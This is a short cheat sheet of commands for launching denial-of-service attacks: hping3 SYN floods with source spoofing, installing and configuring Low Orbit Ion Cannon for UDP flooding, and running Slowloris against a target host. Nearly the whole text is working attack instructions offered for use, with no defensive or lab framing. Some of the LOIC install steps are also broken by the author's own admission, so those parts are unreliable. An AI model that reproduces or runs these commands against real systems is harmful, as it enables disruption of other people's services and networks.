Denial of Service Attack using HPING3:

hping3 --flood -S [insert address]
hping3 --flood -S --spoof [inser address]

Denial of Service Attack using Low Orbit Ion Cannon:
--------------------------------------------------------------------------------
aptitude install git-core mono-complete                                        |
cd /home/kali/Desktop                                                          |
mkdir loic                                                                     |
cd loic                                                                        |
wget https://github.com/NewEraCracker/LOIC/blob/master/loic.sh                 |
chmod 777 loic.sh                                                              |
./loic.sh install                                                              |
./loic.sh update (optional)                                                    |
apt-get install mono-mgcs (instead install mono-gcs)                           |
./loic.sh run                                                                  |
(replace code in loic.sh with the one on github - no idea why it didnt work,   |
might as well just copy paste the script yourself)                             |
                                                                               |
[Low Orbit Ion Cannon]                                                         |
------[options]-------                                                         | 
URL -> enter url                                                               |
press [Lock On]                                                                |
[V] Append random chars to the subsite / message                               |
[UDP] <- Method                                                                |
[50] <- Threads                                                                |
-------------------------------------------------------------------------------|

Denial of Service Attack using SlowLoris:

git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py example.com
